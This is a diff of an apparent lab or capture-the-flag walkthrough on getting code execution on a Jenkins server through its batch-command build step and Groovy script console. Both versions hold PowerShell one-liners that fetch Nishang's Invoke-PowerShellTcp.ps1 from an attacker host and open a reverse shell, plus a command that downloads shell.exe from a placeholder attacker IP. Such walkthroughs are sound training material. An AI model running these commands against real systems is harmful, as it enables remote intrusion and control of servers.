@@ -83,10 +83,23 @@ I'm already in.
 
 The Jenkins documentation gives me two possible ways of Remote Code Execution:
 
-1. Click "Project" to get into the prebuilt project, then click  "Configure" on the left. Scrolling down, there is a window that allows for executing Windows batch commands.
-2. Jenkins also comes with a "Script Console" administrative tool, which allows authenticated users to run scripts using Apache [Groovy](http://www.groovy-lang.org/), a Java-syntax-compatible object-oriented programming language for the Java platform. On the mainpage on the left, click on "Manage Jenkins", scroll down below the warnings, and click [script console](https://www.jenkins.io/doc/book/managing/script-console/) from the list.
+1. Click "Project" to get into the prebuilt project, then click  "Configure" on the left. Scrolling down, there is a 
+window that allows for executing Windows batch commands.
 
-A PowerShell command to execute a reverse shell might work. "Nishang" contains a lot of reverse shell payloads and more.
+| ![Windows batch commands window in project configuration](../../_static/images/build.png)
+|:--:|
+| Windows batch commands window in project configuration|
+
+2. Jenkins also comes with a "Script Console" administrative tool, which allows authenticated users to run scripts 
+using Apache [Groovy](http://www.groovy-lang.org/), a Java-syntax-compatible object-oriented programming language 
+for the Java platform. On the mainpage on the left, click on "Manage Jenkins", scroll down below the warnings, 
+and click [script console](https://www.jenkins.io/doc/book/managing/script-console/) from the list.
+
+| [![Script console](../../_static/images/script-console.png)](https://www.jenkins.io/doc/book/managing/script-console/) |
+|:--:|
+| [https://www.jenkins.io/doc/book/managing/script-console/](https://www.jenkins.io/doc/book/managing/script-console/) |
+
+A PowerShell command to execute a reverse shell might work in both. "Nishang" contains a lot of reverse shell payloads and more.
 
 If on Kali, copy `Invoke-PowershellTcp.ps1` from `/usr/share/nishang/Shells`. If not on Kali, 
 [download Invoke-PowershellTcp.ps1 from Gihub](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1).
@@ -95,24 +108,16 @@ I decided not to copy and just host the entire Nishang Shells directory, by star
 `/usr/share/nishang/Shells`:
 
 	# python3 -m http.server 80
+    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
-Option 1: Execute windows batch command window
-
-Test with:
-
-	whoami
+Option 1: Execute in windows batch command window - Test with: `whoami`, and if works:
 
 ```text
 powershell iex (New-Object Net.WebClient).DownloadString(‘http://<IP address attack machine>:<http-server port>/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>
 ```
 
-Option 2: Script console
-
-Testing remote command execution through the execute function, using "print" to display the output of the command:
-
-	print "whoami".execute().text
-
-In the script console:
+Option 2: Script console - Test using "print" to display the output of the command: `print "whoami".execute().text`, 
+and if works:
 
 ```text
 print "powershell IEX(New-Object Net.WebClient).downloadString('http://<IP address attack machine>:<http-server port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP address attack machine> -Port <netcat listener port>".execute().text
@@ -132,7 +137,7 @@ Set up a Python web server to host the reverse shell:
 
 	# python3 -m http.server 8080
 
-Download the shell.exe into the Target machine using Jenkins:
+Download the `shell.exe` to the target machine:
 
 	PS  C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://[ATTACKER IP]:8888/shell.exe','shell.exe')"
 
